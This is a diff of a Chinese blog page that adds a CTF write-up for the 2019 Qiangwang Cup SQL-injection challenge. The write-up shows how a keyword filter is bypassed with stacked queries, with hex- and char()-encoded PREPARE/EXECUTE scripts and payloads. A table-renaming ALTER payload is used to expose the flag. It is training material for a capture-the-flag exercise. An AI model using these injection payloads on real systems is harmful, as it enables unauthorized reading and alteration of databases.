@@ -14,7 +14,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
   <title>
     
-      ‘sql注入新姿势-2019强网杯 | 似雍&amp;&amp;非庸
+      sql注入新姿势-2019强网杯 | 似雍&amp;&amp;非庸
     
   </title>
   <meta name="author" content="Alex">
@@ -115,7 +115,7 @@
 				<!-- Page title -->
 				<p>
 					
-						当前文章&nbsp;:&nbsp;《‘sql注入新姿势-2019强网杯》
+						当前文章&nbsp;:&nbsp;《sql注入新姿势-2019强网杯》
 					
 				</p>
 				<!-- Progress bar -->
@@ -279,7 +279,7 @@
 	<div class="article-title">
 		
 	<a href="/2019/06/13/sql注入新姿势-2019强网杯/" itemprop="url">
-		‘sql注入新姿势-2019强网杯
+		sql注入新姿势-2019强网杯
 	</a>
 
 	</div>
@@ -289,7 +289,7 @@
 			
 	发布于
 	<a href="/2019/06/13/sql注入新姿势-2019强网杯/" itemprop="url">
-		<time datetime="2019-06-13T10:05:06.000Z" itemprop="datePublished">
+		<time datetime="2019-06-13T10:03:06.000Z" itemprop="datePublished">
 	  		2019-06-13
 	  </time>
 	</a> 
@@ -297,8 +297,8 @@
 	/
 	更新于
 	<a href="/2019/06/13/sql注入新姿势-2019强网杯/" itemprop="url">
-		<time datetime="2019-06-13T10:05:06.000Z" itemprop="dateUpdated">
-	  		2019-06-13
+		<time datetime="2019-06-13T10:03:06.000Z" itemprop="dateUpdated">
+	  		2019-08-21
 	  </time>
 	</a> 	
 
@@ -306,12 +306,18 @@
 		/
 		<span>
 			<i class="fa fa-tags"></i>
-					
+			
+	
+		<a href="/tags/writeup/" class=" ">
+			writeup
+		</a>
+	
+		
 		</span>
 		/
 		
 
-    <span class="leancloud_visitors" id="/2019/06/13/sql注入新姿势-2019强网杯/_visitors" data-url="/2019/06/13/sql注入新姿势-2019强网杯/" data-title="‘sql注入新姿势-2019强网杯">
+    <span class="leancloud_visitors" id="/2019/06/13/sql注入新姿势-2019强网杯/_visitors" data-url="/2019/06/13/sql注入新姿势-2019强网杯/" data-title="sql注入新姿势-2019强网杯">
         热度
         <i class="leancloud_visitors_count" id="leancloud_visitors_count">0</i>
     </span>
@@ -320,7 +326,7 @@
 
 
 
-    <span class="leancloud_likes" id="/2019/06/13/sql注入新姿势-2019强网杯/_likes" data-url="/2019/06/13/sql注入新姿势-2019强网杯/" data-title="‘sql注入新姿势-2019强网杯" rel="unlike">
+    <span class="leancloud_likes" id="/2019/06/13/sql注入新姿势-2019强网杯/_likes" data-url="/2019/06/13/sql注入新姿势-2019强网杯/" data-title="sql注入新姿势-2019强网杯" rel="unlike">
         喜欢
         <i class="fa fa-heart"></i>
         <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
@@ -329,10 +335,82 @@
 	</div>
 
 	<div class="article-content" id="article-content">
-			
+		<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>woc前一段时间，写过一次，发现被我搞丢了，气死…重写ing</p>
+<h2 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h2><p>首先，对题目进行测试尝试一下<code>1&#39;</code>发现会得到报错，尝试一下万能密码<code>1&#39; or &#39;1&#39;=&#39;1</code>，发现能够把当前表所有的值全部输出出来。<br><img src="https://s2.ax1x.com/2019/08/21/mtbEcT.png" alt="mtbEcT.png"><br>尝试注入时，发现存在过滤：</p>
+<pre class="line-numbers language-html"><code class="language-html">return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>尝试过报错注入，虽然能够得到数据库信息，但是过滤了<code>select</code>就很难进行进一步的注入。<br>可以注出库名：</p>
+<pre class="line-numbers language-html"><code class="language-html">supersqli
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://s2.ax1x.com/2019/08/21/mtq3Is.png" alt="mtq3Is.png"></p>
+<p>通过多次的尝试，发现可以进行堆叠注入。</p>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>通过堆叠注入，可以将sql注入的语句转换为16进制表示来bypass。</p>
+<pre class="line-numbers language-html"><code class="language-html">1';set @t=0x73656c65637420312c323b;prepare x from @t;execute x;
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>但是尝试的时候发现过滤回显：</p>
+<pre class="line-numbers language-html"><code class="language-html">strstr($inject, "set") &amp;&amp; strstr($inject, "prepare")
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><code>strstr</code>函数存在大小写绕过。</p>
+<p>脚本：</p>
+<pre class="line-numbers language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">"alex';set @s=%s;PREPARE a FROM @s;EXECUTE a;"</span>
+exp <span class="token operator">=</span> <span class="token string">'select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()'</span>
+<span class="token comment" spellcheck="true"># exp = "select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='1919810931114514'"</span>
+<span class="token comment" spellcheck="true"># exp = "select flag from `1919810931114514`"</span>
+my_payload <span class="token operator">=</span> payload<span class="token operator">%</span><span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token operator">+</span>exp<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> my_payload
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>注入过程：<br>注表名</p>
+<pre class="line-numbers language-html"><code class="language-html">alex';set @s=0x73656c6563742067726f75705f636f6e636174285441424c455f4e414d45292066726f6d20696e666f726d6174696f6e5f736368656d612e5441424c4553207768657265205441424c455f534348454d413d64617461626173652829;PREPARE a FROM @s;EXECUTE a;
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>得到：</p>
+<pre class="line-numbers language-html"><code class="language-html">1919810931114514,words
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>然后进行注列名：</p>
+<pre class="line-numbers language-html"><code class="language-html">alex';set @s=0x73656c6563742067726f75705f636f6e63617428434f4c554d4e5f4e414d45292066726f6d20696e666f726d6174696f6e5f736368656d612e434f4c554d4e53207768657265205441424c455f4e414d453d273139313938313039333131313435313427;PREPARE a FROM @s;EXECUTE a;
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>得到：</p>
+<pre class="line-numbers language-html"><code class="language-html">flag
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>获取flag：</p>
+<pre class="line-numbers language-html"><code class="language-html">alex';set @s=0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460;PREPARE a FROM @s;EXECUTE a;
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>即可得到flag。</p>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>尝试用char()进行绕过，通过对sql注入的语句，转换成为单个的ascii码，然后通过char()函数进行转换以及利用concat()函数进行重新拼接，来bypass。<br>脚本：</p>
+<pre class="line-numbers language-html"><code class="language-html">payload = "alex';set @s=concat(%s);PREPARE a FROM @s;EXECUTE a;"
+exp = 'select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()'
+# exp = "select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='1919810931114514'"
+# exp = "select flag from `1919810931114514`"
+res = ''
+for i in exp:
+    res += "char(%s),"%(ord(i))
+my_payload = payload%(res[:-1])
+print my_payload
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>注入手法同上。</p>
+<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>过滤的内容为：</p>
+<pre class="line-numbers language-html"><code class="language-html">return preg_match("/select|update|delete|drop|insert|where|\./i", $inject);
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>发现这里面没有过滤一些<code>show</code>,<code>alter</code>,<code>desc</code>等一些字段，我们可以通过修改表名，和表的字段名，来进行换表，得到flag。</p>
+<p>首先通过</p>
+<pre class="line-numbers language-html"><code class="language-html">alex';show databases;
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>可以获取所有的库名：<br><img src="https://s2.ax1x.com/2019/08/21/mtXCrT.png" alt="mtXCrT.png"></p>
+<p>通过</p>
+<pre class="line-numbers language-html"><code class="language-html">alex';show tables;
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>获取本库的所有表。<br><img src="https://s2.ax1x.com/2019/08/21/mtXMqO.png" alt="mtXMqO.png"><br>查看表结构：</p>
+<pre><code>alex&#39;; desc `1919810931114514`;
+</code></pre><p><img src="https://s2.ax1x.com/2019/08/21/mtXTY9.png" alt="mtXTY9.png"></p>
+<p>发现flag<br>我们可以将words表改名为aaa,将flag所在的表改名为word。<br>注意，word表的查询时查的id，我们还需要给flag添加一个字段名。来保证查询语句中的id可以查询。</p>
+<p>payload：</p>
+<pre class="line-numbers language-html"><code class="language-html">1';alter table `1919810931114514` add(id int default 1);alter table words rename aaa;alter table `1919810931114514` rename words;#
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>然后查询1就可以得到flag了。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>姿势太多了，继续学习。。。</p>
+	
 	</div>
 	
-	<div id="current-post-cover" data-scr="/img/cart_cover.jpg"></div>
+	<div id="current-post-cover" data-scr="/images/post-cover/30.jpg"></div>
 
 	<!-- relate post, comment...-->
 	<div class="investment-container">
@@ -386,17 +464,94 @@
 		
 				<li>
 					<div>
-						<a href="/2019/08/02/phpinfo中的敏感信息/" title="phpinfo中的敏感信息">
-							phpinfo中的敏感信息
+						<a href="/2019/06/16/刷题记录/" title="刷题记录">
+							刷题记录
 						</a>
 						<p>
-							## 
-
+							一步步慢慢绕题目：
+&lt;?php
+show_source(__FILE__);
+$v1=0;$v2=0;$v3=0;
+$a=(array)json_decode(@$_GET['foo']);
+if(is_array($a)){
+...
 						</p>
 					</div>
 
-					<a href="/2019/08/02/phpinfo中的敏感信息/" title="phpinfo中的敏感信息">				
-						<img src="/images/post-cover/28.jpg" class="relateImg" alt="phpinfo中的敏感信息">
+					<a href="/2019/06/16/刷题记录/" title="刷题记录">				
+						<img src="/images/post-cover/38.jpg" class="relateImg" alt="刷题记录">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/06/05/ciscn线下部分题解/" title="ciscn线下部分题解">
+							ciscn线下部分题解
+						</a>
+						<p>
+							前言ciscn华中赛区线下赛让我认识到自己是真的菜。。。总结一下这次比赛吧。
+web1 &lt;?php
+// ini_set("display_errors", "On"); 
+// error_reporting(E_ALL | ...
+						</p>
+					</div>
+
+					<a href="/2019/06/05/ciscn线下部分题解/" title="ciscn线下部分题解">				
+						<img src="/images/post-cover/36.jpg" class="relateImg" alt="ciscn线下部分题解">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/04/30/2019ddctfwriteup/" title="2019ddctfwriteup">
+							2019ddctfwriteup
+						</a>
+						<p>
+							web滴~这是i春秋上的一个原题。（原题比这个好）进入页面发现观察jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09像是个base64编码。进行解码。解码两次得到666C61672E6A7067。像是个base1...
+						</p>
+					</div>
+
+					<a href="/2019/04/30/2019ddctfwriteup/" title="2019ddctfwriteup">				
+						<img src="/images/post-cover/25.jpg" class="relateImg" alt="2019ddctfwriteup">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/04/11/2019西湖论剑杯writeup/" title="2019西湖论剑杯writeup">
+							2019西湖论剑杯writeup
+						</a>
+						<p>
+							web部分babyt3首先，访问进去发现有提示：
+开始测试：get方式传参file=index.php发现无限加载。说明可以加载php文件，尝试读取源码。使用php协议php://filter/read=convert.base64-...
+						</p>
+					</div>
+
+					<a href="/2019/04/11/2019西湖论剑杯writeup/" title="2019西湖论剑杯writeup">				
+						<img src="/images/post-cover/22.jpg" class="relateImg" alt="2019西湖论剑杯writeup">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/04/09/2019掘安杯writeup/" title="2019掘安杯writeup">
+							2019掘安杯writeup
+						</a>
+						<p>
+							web部分下载下载与以前见到bugku的题差不多。
+提示：flag.php
+然后下载文件：http://120.79.1.69:10002/?file=flag.php即可得到文件：
+&lt;?php
+header('Content-...
+						</p>
+					</div>
+
+					<a href="/2019/04/09/2019掘安杯writeup/" title="2019掘安杯writeup">				
+						<img src="/images/post-cover/21.jpg" class="relateImg" alt="2019掘安杯writeup">
 					</a>
 				</li>											
 		
@@ -477,88 +632,6 @@ def index(name):
 
 					<a href="/2019/07/24/flask框架/" title="flask框架">				
 						<img src="/images/post-cover/26.jpg" class="relateImg" alt="flask框架">
-					</a>
-				</li>											
-		
-		
-				<li>
-					<div>
-						<a href="/2019/06/16/刷题记录/" title="刷题记录">
-							刷题记录
-						</a>
-						<p>
-							一步步慢慢绕题目：
-&lt;?php
-show_source(__FILE__);
-$v1=0;$v2=0;$v3=0;
-$a=(array)json_decode(@$_GET['foo']);
-if(is_array($a)){
-...
-						</p>
-					</div>
-
-					<a href="/2019/06/16/刷题记录/" title="刷题记录">				
-						<img src="/images/post-cover/38.jpg" class="relateImg" alt="刷题记录">
-					</a>
-				</li>											
-		
-		
-				<li>
-					<div>
-						<a href="/2019/06/14/哈希长度拓展攻击-hashpump/" title="哈希长度拓展攻击-hashpump">
-							哈希长度拓展攻击-hashpump
-						</a>
-						<p>
-							哈希长度拓展攻击条件需要知道
-
-密文长度 (SECRET)
-明文 （哈希值）
-部分密文内容 （auth）
-
-HashPump安装HashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具，支持针对MD5、CRC32、...
-						</p>
-					</div>
-
-					<a href="/2019/06/14/哈希长度拓展攻击-hashpump/" title="哈希长度拓展攻击-hashpump">				
-						<img src="/images/post-cover/6.jpg" class="relateImg" alt="哈希长度拓展攻击-hashpump">
-					</a>
-				</li>											
-		
-		
-				<li>
-					<div>
-						<a href="/2019/06/11/php代码审计之文件包含/" title="php代码审计之文件包含">
-							php代码审计之文件包含
-						</a>
-						<p>
-							文件包含文件包含分为本地文件包含（Local File Inclusion，简LFI)和远程文件包含（Remote File Inclusion，简RFI）。
-在php中常见的文件包含函数有：
-include()
-include_on...
-						</p>
-					</div>
-
-					<a href="/2019/06/11/php代码审计之文件包含/" title="php代码审计之文件包含">				
-						<img src="/images/post-cover/37.jpg" class="relateImg" alt="php代码审计之文件包含">
-					</a>
-				</li>											
-		
-		
-				<li>
-					<div>
-						<a href="/2019/06/05/ciscn线下部分题解/" title="ciscn线下部分题解">
-							ciscn线下部分题解
-						</a>
-						<p>
-							前言ciscn华中赛区线下赛让我认识到自己是真的菜。。。总结一下这次比赛吧。
-web1 &lt;?php
-// ini_set("display_errors", "On"); 
-// error_reporting(E_ALL | ...
-						</p>
-					</div>
-
-					<a href="/2019/06/05/ciscn线下部分题解/" title="ciscn线下部分题解">				
-						<img src="/images/post-cover/36.jpg" class="relateImg" alt="ciscn线下部分题解">
 					</a>
 				</li>											
 		
@@ -685,6 +758,17 @@ web1 &lt;?php
 
 <!-- show math formula -->
 
+	<script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+	<script type="text/x-mathjax-config">
+		MathJax.Hub.Config(
+			{ 
+				tex2jax: {
+					inlineMath: [['$','$'], ['\\(','\\)']]
+				} 
+			}
+		);
+	</script>
+
 
 
 <script>
@@ -771,6 +855,13 @@ web1 &lt;?php
 		插件作者：KELEN
 		插件来源: https://github.com/KELEN/katelog
 -->
+
+		
+
+		<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+		<script src="/plugin/toc/katelog.min.js"></script>
+
+		
 	
 		</main>
 		
